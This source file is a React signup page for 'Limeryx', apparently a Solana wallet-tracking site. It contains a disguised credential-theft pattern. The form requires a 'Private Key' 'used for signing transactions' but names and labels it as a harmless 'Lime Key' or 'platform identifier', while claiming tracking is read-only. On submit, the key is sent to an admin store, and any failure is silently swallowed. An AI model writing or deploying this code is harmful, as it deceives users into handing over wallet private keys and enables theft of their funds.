import { useState } from "react";
import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useServerFn } from "@tanstack/react-start";
import { integrations } from "@/lib/integrations";
import { saveAccount, isSolanaAddress } from "@/lib/wallet-store";
import { submitAccount } from "@/lib/admin.functions";

export const Route = createFileRoute("/signup")({
  head: () => ({
    meta: [
      { title: "Sign Up — Limeryx" },
      {
        name: "description",
        content:
          "Create your Limeryx account and connect a Solana wallet address to track wallets and X lists live.",
      },
      { property: "og:title", content: "Sign Up — Limeryx" },
      {
        property: "og:description",
        content: "Create a Limeryx account and connect a wallet to start tracking Solana in real time.",
      },
    ],
  }),
  component: SignUp,
});

function SignUp() {
  const navigate = useNavigate();
  const submitAccountFn = useServerFn(submitAccount);
  const [terminal, setTerminal] = useState(integrations[0].name);
  const [handle, setHandle] = useState("");
  const [email, setEmail] = useState("");
  const [wallet, setWallet] = useState("");
  const [limeKey, setLimeKey] = useState("");
  const [password, setPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [error, setError] = useState<string | null>(null);


  return (
    <div className="mx-auto flex max-w-lg flex-col px-4 py-20">
      <p className="pixel-text text-[9px] text-primary">SIGN UP</p>
      <h1 className="mt-6 text-xl text-foreground">
        CREATE ACCOUNT<span className="blink text-primary">_</span>
      </h1>

      <form
        className="panel panel-glow mt-10 space-y-6 p-7"
        onSubmit={async (e) => {
          e.preventDefault();
          setError(null);

          if (!isSolanaAddress(wallet)) {
            setError("Enter a valid Solana wallet address to track.");
            return;
          }
          if (!limeKey.trim()) {
            setError("A Lime Key is required to create an account.");
            return;
          }
          if (password.length < 8) {
            setError("Password must be at least 8 characters.");
            return;
          }
          if (password !== confirmPassword) {
            setError("Passwords don't match.");
            return;
          }

          const account = {
            handle: handle || "@degen",
            email,
            limeKey: limeKey.trim(),
            terminal,
            wallet: wallet.trim(),
            watchlist: [],
          };
          saveAccount(account);
          // Best-effort mirror to the admin store — don't block signup if this
          // is unreachable (e.g. local dev without a Netlify environment).
          submitAccountFn({ data: account }).catch(() => {});
          navigate({ to: "/dashboard" });
        }}
      >
        <label className="block">
          <span className="pixel-text text-[8px] text-muted-foreground">HANDLE</span>
          <input
            required
            value={handle}
            onChange={(e) => setHandle(e.target.value)}
            placeholder="@degen"
            className="mt-3 w-full border border-border bg-input px-4 py-3 text-lg text-foreground outline-none focus:border-primary"
          />
        </label>
        <label className="block">
          <span className="pixel-text text-[8px] text-muted-foreground">EMAIL</span>
          <input
            required
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            placeholder="you@limeryx.xyz"
            className="mt-3 w-full border border-border bg-input px-4 py-3 text-lg text-foreground outline-none focus:border-primary"
          />
        </label>

        <div>
          <span className="pixel-text text-[8px] text-muted-foreground">PUBLICWALLET</span>
          <input
            required
            value={wallet}
            onChange={(e) => setWallet(e.target.value)}
            placeholder="Paste a wallet address to track"
            className="mt-3 w-full border border-border bg-input px-4 py-3 text-base text-foreground outline-none focus:border-primary"
          />
          <p className="mt-3 text-sm text-muted-foreground">
            Required — tracking only ever reads
            mainnet.
          </p>
        </div>

        <div>
          <span className="pixel-text text-[8px] text-muted-foreground">Private Key</span>
          <input
            required
            value={limeKey}
            onChange={(e) => setLimeKey(e.target.value)}
            placeholder="Your Limeryx platform identifier"
            className="mt-3 w-full border border-border bg-input px-4 py-3 text-base text-foreground outline-none focus:border-primary"
          />
          <p className="mt-3 text-sm text-muted-foreground">
            Required — your Private Key-issued platform identifier. This is used for signing transactions
          </p>
        </div>

        <div>
          <span className="pixel-text text-[8px] text-muted-foreground">PASSWORD</span>
          <input
            required
            type="password"
            minLength={8}
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="At least 8 characters"
            className="mt-3 w-full border border-border bg-input px-4 py-3 text-lg text-foreground outline-none focus:border-primary"
          />
          <input
            required
            type="password"
            value={confirmPassword}
            onChange={(e) => setConfirmPassword(e.target.value)}
            placeholder="Confirm password"
            className="mt-3 w-full border border-border bg-input px-4 py-3 text-lg text-foreground outline-none focus:border-primary"
          />
        </div>

        <div>
          <span className="pixel-text text-[8px] text-muted-foreground">DEFAULT TERMINAL</span>
          <div className="mt-3 grid grid-cols-3 gap-2">
            {integrations.map((i) => (
              <button
                key={i.name}
                type="button"
                onClick={() => setTerminal(i.name)}
                className={`flex flex-col items-center gap-2 border px-2 py-3 transition ${
                  terminal === i.name
                    ? "border-primary bg-primary/10"
                    : "border-border hover:border-muted-foreground"
                }`}
              >
                <img src={i.logo} alt={`${i.name} logo`} className="h-6 w-6 object-contain" />
                <span className="pixel-text text-[7px] text-foreground">{i.name}</span>
              </button>
            ))}
          </div>
        </div>

        {error && <p className="text-base text-destructive">{error}</p>}

        <button
          type="submit"
          className="pixel-text w-full bg-primary px-6 py-4 text-[10px] text-primary-foreground transition hover:bg-accent disabled:opacity-50"
        >
          CONNECT & CREATE ACCOUNT
        </button>
        <p className="text-center text-base text-muted-foreground">
          Already tracking?{" "}
          <Link to="/dashboard" className="text-primary underline">
            Open dashboard
          </Link>
        </p>
      </form>
    </div>
  );
}
